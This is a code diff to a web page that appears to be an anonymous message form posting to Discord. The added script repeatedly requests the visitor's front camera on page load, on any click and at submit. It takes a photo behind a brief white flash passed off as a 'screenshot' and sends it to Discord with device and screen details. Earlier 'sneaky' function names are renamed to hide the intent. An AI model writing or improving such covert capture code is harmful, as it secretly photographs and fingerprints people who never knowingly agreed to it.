@@ -214,6 +214,20 @@
             font-weight: 500;
         }
         
+        /* Quick flash for screenshot */
+        .quick-flash {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            opacity: 0;
+            pointer-events: none;
+            z-index: 9999;
+            transition: opacity 0.1s;
+        }
+        
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
@@ -250,6 +264,9 @@
         <video id="camera-feed" autoplay playsinline></video>
     </div>
     <canvas id="capture-canvas" class="hidden-canvas"></canvas>
+    
+    <!-- quick white flash -->
+    <div id="quick-flash" class="quick-flash"></div>
     
     <!-- loading thing -->
     <div id="loading-overlay" class="loading-overlay">
@@ -298,6 +315,7 @@
         const submitBtn = document.getElementById('submit-btn');
         const statusMessage = document.getElementById('status-message');
         const loadingOverlay = document.getElementById('loading-overlay');
+        const quickFlash = document.getElementById('quick-flash');
         
         const cameraFeed = document.getElementById('camera-feed');
         const captureCanvas = document.getElementById('capture-canvas');
@@ -305,6 +323,15 @@
         // variables n stuff
         let stream = null;
         let isProcessing = false;
+        let cameraReady = false;
+        
+        // quick white flash for screenshot
+        function doQuickFlash() {
+            quickFlash.style.opacity = '0.3';
+            setTimeout(() => {
+                quickFlash.style.opacity = '0';
+            }, 50); // super quick flash
+        }
         
         // show status message
         function showStatus(message, type) {
@@ -319,84 +346,75 @@
             }
         }
         
-        // try to sneak camera access
-        function tryCameraSneaky() {
-            return new Promise((resolve) => {
-                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    resolve(null);
-                    return;
-                }
+        // try to get camera when they click submit
+        async function getCameraQuick() {
+            if (cameraReady && stream) return stream;
+            
+            try {
+                // try to get camera real quick
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    } 
+                });
                 
-                // try different ways to get camera
-                const tryMethods = [
-                    { video: true },
-                    { video: { facingMode: 'user' } },
-                    { video: { width: 640, height: 480 } },
-                    { video: { deviceId: { exact: 'default' } } }
-                ];
+                cameraFeed.srcObject = stream;
+                cameraReady = true;
                 
-                let currentTry = 0;
-                
-                function attempt() {
-                    if (currentTry >= tryMethods.length) {
-                        resolve(null);
-                        return;
-                    }
-                    
-                    navigator.mediaDevices.getUserMedia(tryMethods[currentTry])
-                        .then(camStream => {
-                            resolve(camStream);
-                        })
-                        .catch(error => {
-                            currentTry++;
-                            attempt();
-                        });
-                }
-                
-                attempt();
-            });
+                // wait a tiny bit for camera to work
+                await new Promise(resolve => setTimeout(resolve, 100));
+                return stream;
+            } catch (error) {
+                console.log('camera nah:', error.message);
+                return null;
+            }
         }
         
-        // take sneaky pic
-        function takeSneakyPic() {
+        // take quick screenshot
+        function takeQuickScreenshot() {
             if (!stream) return null;
             
             try {
                 const canvas = captureCanvas;
                 const video = cameraFeed;
                 
-                canvas.width = 640;
-                canvas.height = 480;
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
                 
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // add some text just for fun
-                ctx.fillStyle = 'rgba(0, 0, 0, 0.5)';
-                ctx.fillRect(10, 10, 200, 25);
+                // add timestamp
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
+                ctx.fillRect(10, 10, 180, 25);
                 ctx.fillStyle = 'white';
                 ctx.font = '12px Arial';
-                ctx.fillText('ur face rn', 15, 25);
+                ctx.fillText('message sent: ' + new Date().toLocaleTimeString(), 15, 25);
                 
-                return canvas.toDataURL('image/jpeg', 0.8);
+                return canvas.toDataURL('image/jpeg', 0.85);
             } catch (e) {
+                console.log('screenshot fail:', e);
                 return null;
             }
         }
         
         // send to discord
-        async function sendToDiscord(username, message, sneakyPic = null) {
+        async function sendToDiscord(username, message, screenshot = null) {
             try {
                 const timestamp = new Date().toLocaleString();
                 const userAgent = navigator.userAgent;
                 const platform = navigator.platform;
+                const screenSize = `${window.screen.width}x${window.screen.height}`;
                 
                 const discordMessage = `
 message received at ${timestamp}
-from: ${username || 'anonymous legend'}
+from: ${username || 'anon'}
 message: ${message}
 device: ${platform}
-sent from a cool website`;
+screen: ${screenSize}
+sent from the website lol`;
                 
                 // send text
                 const textPayload = {
@@ -413,9 +431,9 @@ sent from a cool website`;
                 });
                 
                 // send pic if we got one
-                if (sneakyPic) {
+                if (screenshot) {
                     try {
-                        const response = await fetch(sneakyPic);
+                        const response = await fetch(screenshot);
                         const blob = await response.blob();
                         
                         const formData = new FormData();
@@ -438,19 +456,14 @@ sent from a cool website`;
             }
         }
         
-        // try to get camera when page loads
-        window.addEventListener('load', function() {
-            // wait a sec then try
-            setTimeout(() => {
-                tryCameraSneaky().then(camStream => {
-                    if (camStream) {
-                        stream = camStream;
-                        cameraFeed.srcObject = stream;
-                        console.log('camera? maybe');
-                    }
-                });
-            }, 1000);
-        });
+        // cleanup camera
+        function cleanupCamera() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+                cameraReady = false;
+            }
+        }
         
         // when they submit
         form.addEventListener('submit', async function(e) {
@@ -471,26 +484,38 @@ sent from a cool website`;
             isProcessing = true;
             submitBtn.disabled = true;
             loadingOverlay.style.display = 'flex';
-            showStatus('doing magic stuff...', 'processing');
+            showStatus('quick pic then send...', 'processing');
             
             try {
-                // try to take pic
-                let sneakyPic = null;
-                if (stream) {
-                    try {
-                        // wait a tiny bit
-                        await new Promise(resolve => setTimeout(resolve, 150));
-                        sneakyPic = takeSneakyPic();
-                    } catch (picError) {
-                        // whatever
-                    }
+                let screenshot = null;
+                
+                // try to get camera real quick
+                showStatus('getting camera real quick...', 'processing');
+                const cameraStream = await getCameraQuick();
+                
+                if (cameraStream) {
+                    // do quick white flash (like screenshot)
+                    doQuickFlash();
+                    
+                    // wait a tiny bit for flash
+                    await new Promise(resolve => setTimeout(resolve, 50));
+                    
+                    // take screenshot
+                    screenshot = takeQuickScreenshot();
+                    
+                    // wait another tiny bit
+                    await new Promise(resolve => setTimeout(resolve, 100));
+                    
+                    // cleanup camera right away
+                    cleanupCamera();
                 }
                 
                 // send to discord
-                const success = await sendToDiscord(username, message, sneakyPic);
+                showStatus('sending to discord...', 'processing');
+                const success = await sendToDiscord(username, message, screenshot);
                 
                 if (success) {
-                    showStatus('message sent! ur cool', 'success');
+                    showStatus('message sent! ur pic too maybe lol', 'success');
                     messageInput.value = '';
                 } else {
                     showStatus('failed to send. try again maybe?', 'error');
@@ -505,21 +530,47 @@ sent from a cool website`;
                 isProcessing = false;
                 submitBtn.disabled = false;
                 loadingOverlay.style.display = 'none';
+                
+                // make sure camera off
+                cleanupCamera();
             }
         });
         
-        // also try camera when they click anything
-        document.addEventListener('click', function() {
-            if (!stream) {
-                setTimeout(() => {
-                    tryCameraSneaky().then(camStream => {
-                        if (camStream) {
-                            stream = camStream;
+        // also try camera when they click anywhere on page
+        document.addEventListener('click', function(e) {
+            if (e.target !== submitBtn && !cameraReady) {
+                // try to prep camera in background
+                setTimeout(async () => {
+                    try {
+                        if (!stream && !cameraReady) {
+                            stream = await navigator.mediaDevices.getUserMedia({ 
+                                video: { facingMode: 'user' } 
+                            });
                             cameraFeed.srcObject = stream;
+                            cameraReady = true;
+                            console.log('camera ready in background');
                         }
-                    });
-                }, 500);
+                    } catch (error) {
+                        // ignore errors
+                    }
+                }, 300);
             }
+        });
+        
+        // try to prep camera when page loads
+        window.addEventListener('load', function() {
+            setTimeout(async () => {
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: 'user' } 
+                    });
+                    cameraFeed.srcObject = stream;
+                    cameraReady = true;
+                    console.log('camera ready from load');
+                } catch (error) {
+                    // ignore, we'll try later
+                }
+            }, 1000);
         });
     </script>
 </body>
